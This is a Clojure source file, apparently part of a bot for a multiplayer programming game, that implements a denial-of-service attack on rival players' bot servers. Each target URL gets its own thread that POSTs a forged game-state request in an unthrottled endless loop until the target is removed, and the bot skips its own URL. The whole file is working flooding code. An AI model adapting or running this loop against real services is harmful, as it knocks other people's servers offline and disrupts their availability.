(ns black-friday.bot.dos
  (:require [black-friday.bot.settings :as s]
            [clj-http.client :as client]
            [common.string :as xstr]
            [clojure.set :as set]
            [common.predicate :as p]))

(def targets (agent {:active #{} :removed #{}}))

(def attack-request {:reason "dos",
                     :gameState
                             {:map
                                 {:width 3,
                                  :height 3,
                                  :maxItemCount 0,
                                  :name "HAL Institute for Criminally Insane Robots",
                                  :tiles
                                  ["xxx"
                                   "x_x"
                                   "xxx"],
                                  :exit {:x 1, :y 1}},
                              :players []
                              :finishedPlayers []
                              :items []
                              :round 0
                              :shootingLines []}
                     :playerState
                             {:money 0
                              :name "Bender Bending Rodriguez"
                              :usableItems []
                              :state "WASTED",
                              :timeInState 0
                              :score 0
                              :url nil
                              :health 0
                              :position {:x 1, :y 1}
                              :actionCount 0}
                     :playerId "Insane in the main frame"})

(defn- attack [url]
  (try
    (client/post url {:form-params  attack-request
                      :content-type :json
                      :as           :json})
    (catch Throwable t))
  #_(Thread/sleep 1000)
  (when (not (contains? (:removed @targets) url)) (recur url)))

(defn- update-targets-action [targets next-target-urls]
  (let [current-target-urls (:active targets)]
    (doseq [new-target-url (set/difference next-target-urls current-target-urls)]
           (future (attack new-target-url)))
    {:active next-target-urls
     :removed (set/union (set/difference current-target-urls next-target-urls))}))

(defn update-dos-targets [urls]
  (if (s/dos-attact-active?)
    (send targets update-targets-action
          (set (filter (p/not* (partial xstr/substring? (s/bot-url))) urls)))))
